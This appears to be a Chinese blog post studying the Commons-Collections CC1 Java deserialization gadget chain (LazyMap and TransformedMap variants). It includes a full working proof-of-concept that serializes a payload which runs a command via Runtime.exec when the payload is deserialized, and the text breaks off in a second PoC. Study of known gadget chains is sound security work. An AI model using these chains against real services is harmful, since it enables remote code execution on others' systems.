<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()).transform(<span class="number">123</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">invoketransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invoketransformer.transform(constantTransformer);</span><br></pre></td></tr></table></figure>

<p>看看简单代码搭配ChainedTransformer是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">     &#125;);</span><br><span class="line">     chain.transform(<span class="number">123</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时只要ChainedTransformer反序列化后调用transform方法并传递任意内容即可实现rce，但是当尝试去序列化的时候，发生了一个问题：</p>
<p>因为这里的Runtime.getRuntime()返回的是一个Runtime的实例，而Runtime并没有继承Serializable，所以这里会序列化失败。</p>
<p>那么我们就需要找到一个方法来获取到Runtime.getRuntime()返回的结果，并将其传入invoketransformer的transform方法中。这就有了上边那条链。</p>
<p>上面说了，其transform方法是将输入的Object原封不动的返回回去，那么我们是不是可以尝试这么搭配：</p>
<p>这里通过InvokerTransformer来实现了一次反射，即通过反射来反射，先是调用getMethod方法获取了getRuntime这个Method对象，接着又通过Invoke获取getRuntime的执行结果。</p>
<p>这里我一开始看Class[].class以及new Class[0]。这里尝试通过反射去调用getMethod方法，而getMethod的定义如下：</p>
<p><img src="https://baicany.github.io/images/1591853.jpg" alt="-w903"></p>
<p>这里需要传入一个name也就是要调用的方法名，接着需要传递一个可变参数，所以这里的Class[].class，其实就是对应着这里的可变参数，即使我们不需要传递参数，也需要在这里加一个Class[].class，后边再加一个new Class[0]起到占位的作用。也可以用null</p>
<p>目前已经构造到只需要反序列化后调用transform方法，并传递任意内容即可rce。我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。</p>
<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()-&gt; </span><br><span class="line">AnnotationInvocationHandler.readObject()  -&gt; AnnotationInvocationHandler(Proxy).entrySet()-&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke()-&gt;</span><br><span class="line">lazymap.get-&gt;</span><br><span class="line">factory.transform(key)</span><br><span class="line"></span><br><span class="line">ObjectInputStream.readObject()-&gt; </span><br><span class="line">AnnotationInvocationHandler.readObject()  -&gt; </span><br><span class="line"><span class="comment">/*过程理解</span></span><br><span class="line"><span class="comment">Transformed.EntrySet()-&gt;</span></span><br><span class="line"><span class="comment">AbstractInputCheckedMapDecorator.EntrySet()-&gt;</span></span><br><span class="line"><span class="comment">Transformed.isSetValueChecking()-&gt;</span></span><br><span class="line"><span class="comment">AbstractInputCheckedMapDecorator.EntrySet(x,y)-&gt;</span></span><br><span class="line"><span class="comment">AbstractInputCheckedMapDecorator.EntrySet.iterator()-&gt;</span></span><br><span class="line"><span class="comment">AbstractInputCheckedMapDecorator.EntrySetIterator.next()-&gt;</span></span><br><span class="line"><span class="comment">var5=AbstractInputCheckedMapDecorator.MapEntry*/</span></span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue() -&gt;</span><br><span class="line">TransformedMap.checkSetValue()-&gt;</span><br><span class="line">valueTransformer.transform(value)-&gt;</span><br></pre></td></tr></table></figure>





<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><h4 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h4><p>Lazymap#get这个方法：</p>
<p><img src="https://baicany.github.io/images/1591853423000.png" alt="-w611"></p>
<p>如果这里的this.factory可控，那么我们就可以通过LazyMap来延长我们的链，下一步就是找哪里调用了get方法了</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure>

<p>这里的factory并没有被transient以及static关键字修饰，所以是我们可控的，并且由于factory是在类初始化时定义的，所以我们可以通过创建LazyMap实例的方式来设置他的值。并且这里需要初始化的map没有包含传入的键名	(后面说)</p>
<p><img src="https://baicany.github.io/images/1591853423000-21embjd.png" alt="-w652"></p>
<p>但是这里的构造方法并不是public的，所以可以通过反射的方式来获取到这个构造方法，再创建其实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过get来执行命令</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">          <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                          String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                          <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                          Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                          <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                          <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">          <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">          <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">          Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">          <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">          constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">          <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)constructor.newInstance(innermap,chain);</span><br><span class="line">          map.get(<span class="number">123</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>接着我们需要找到某个地方调用了get方法，并且传递了任意值。通过学习了上边动态代理的知识，我们可以开始分析cc1的前半段链了。</p>
<p>入口时AnnotationInvocationHandler的readObject：</p>
<p><img src="https://baicany.github.io/images/1626682224442.png" alt="img"></p>
<p>首先调用 <code>AnnotationType.getInstance(this.type)</code>(后面提到) </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">自己简单想一下就知道如果要进入<span class="keyword">if</span>(var7!=<span class="literal">null</span>)就知道了提这里干嘛了</span><br></pre></td></tr></table></figure>

<p>来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取其 memberTypes 属性，这个属性是个 Map，存放这个注解中可以配置的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//AnnotationType   </span></span><br><span class="line">  <span class="keyword">public</span> Map&lt;String, Class&lt;?&gt;&gt; memberTypes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.memberTypes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点是这里Iterator var4 &#x3D; this.memberValues.entrySet().iterator();</p>
<p>memberValues需要这里定义是map但是如果其具体实现类是 Java 运行时生成的动态代理类。通过代理对象调用自定义注解（接口）的方法，会最终调用 AnnotationInvocationHandler 的 invoke 方法。该方法会从 memberValues 这个 Map 中索引出对应的值。</p>
<p>简单来说</p>
<p>这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。不能理解就自己多调试吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学过反射的你一定知道这里的参数是什么</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">var7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">            <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure>

<p>这里对this.memberValues调用了get方法，如果此时this.memberValues为我们的lazymap，那么就会触发LazyMap#get，从而完成触发rce。</p>
<p>完整POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor[] constructors = clazz.getDeclaredConstructors();</span></span><br><span class="line"><span class="comment">//        Constructor constructor = constructors[0];</span></span><br><span class="line"><span class="comment">//        constructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Map map = (Map)constructor.newInstance(innermap,chain);</span></span><br><span class="line">          <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分开名字方便理解</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Target.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc1.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建lazymap那里其实并不需要用到反射，因为lazymap自带了一个方法来帮助我们创建其实例：</p>
<p><img src="https://baicany.github.io/images/1591853425000-29dszga.png" alt="-w896"></p>
<p>所以把上述通过反射来创建LazyMap的实例代码改为如下，也是可以成功的后面那个同理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);</span><br></pre></td></tr></table></figure>

<h4 id="TransformedMap-1"><a href="#TransformedMap-1" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。应为check(改变的时候就要检查字面意思理解很合理吧)这里是利用setvalue改变值</p>
<p>让来看看这里的transform方法和构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//tranform</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以要触发的就是这个了</p>
<p>接着lazymap上面说到var3是一个注解类继续分析到</p>
<p>进入whie循环的作用其实是用<code>this.memberValues</code> 这个 Map ，获取其 Key，如果注解类的 memberTypes 属性中存在与 <code>this.memberValues</code> 的 key 相同的属性，并且取得的值不是 ExceptionProxy 的实例也不是 memberValues 中值的实例，则取得其值，并调用 setValue 方法写入值。要这个玩意就不能var7&#x3D;null所以为什么双个地方一个haspmap可以为空,另一个不可以</p>
<p>而因为我们要利用改变值这里就是memberValues是transformedmap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//       Map.Entry表示映射（Map）中的键值对的接口。它定义了访问和操作键值对的方法。先简单理解这里var7是</span></span><br><span class="line"><span class="comment">// 	     获取我们传入得到值</span></span><br><span class="line">     		Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br></pre></td></tr></table></figure>

<p>this.memberValues这里的值是TranformedMap的实例而实例初始化是(Hashmap，null ,tranformer)，所以这里构造方法会super(map),让父类的方法都变成hashmap的 (看过头了但是有一点帮助吧)</p>
<p>this.memberValues.entrySet()跟进类TranformedMap的entrySet()方法,发现类没有,那就是继承了,跟进父类AbstractInputCheckedMapDecorator的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看isSetValueChecking()这个方法TranformedMap类重写了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer != <span class="literal">null</span>;</span><br><span class="line">因为我们设置了值所以返回<span class="literal">true</span></span><br><span class="line">如果为<span class="literal">false</span>,<span class="built_in">super</span>.map.entrySet());说过了是hashmap的东西并不会把TranformedMa类的方法带进去所以触发不了tranform,自己可以更进一下,这就是<span class="built_in">this</span>的重要性</span><br></pre></td></tr></table></figure>

<p>跟进EntrySet类发现在</p>
<p>跟进AbstractInputCheckedMapDecorator 的EntrySet类,他的构造方法</p>
<p>protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent)</p>
<p>所以不用管第一个传进去的参数因为肯定是set后面也没什么用</p>
<p>但是这里parent参数是this，所以这里parent是tranformap类</p>
<p>继续看</p>
<p>AbstractInputCheckedMapDecorator 的  EntrySet类的iterator() 方法,又创了一个实例所以这里var4出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(<span class="built_in">super</span>.collection.iterator(), <span class="built_in">this</span>.parent);</span><br><span class="line">&#125;<span class="comment">//还是this.parent</span></span><br></pre></td></tr></table></figure>

<p>跟进实例EntrySetIterator类，找到反序列化用到的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title class_">AbstractIteratorDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">EntrySetIterator</span><span class="params">(Iterator iterator, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(iterator);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry)<span class="built_in">super</span>.iterator.next();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, <span class="built_in">this</span>.parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//this.parent</span></span><br></pre></td></tr></table></figure>

<p>hasnext()里面意思理解有没有下一个数据</p>
<p>发现next返回了一个类MapEntry</p>
<p>因为 Map.Entry var5 &#x3D; (Map.Entry)var4.next();</p>
<p>所以var5是这个MapEntry实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">          <span class="built_in">super</span>(entry);<span class="comment">//这里是hashmap</span></span><br><span class="line">          <span class="built_in">this</span>.parent = parent;<span class="comment">//还是那个tran类</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">          value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">可以继续分析了这里var6就是hashmap的键var7就是从var3我们传入那个泛型中得到这个键值的class</span><br><span class="line">    <span class="comment">//Field.get(Object)获取指定实例的指定字段的值。反射</span></span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br></pre></td></tr></table></figure>

<p>继续这里var7!&#x3D;null了,</p>
<p>所以跟进var5里面的setvalue方法就是MapEntry类里面的</p>
<p>所以就触发了checkSetValue,</p>
<p>所以跟进checkSetValue,进入tranformermap类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就触发transform函数了</p>
<p>poc链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span><br><span class="line">            IllegalAccessException, InvocationTargetException, InstantiationException&#123;</span><br><span class="line">        <span class="comment">// 结合 ChainedTransformer</span></span><br><span class="line">        <span 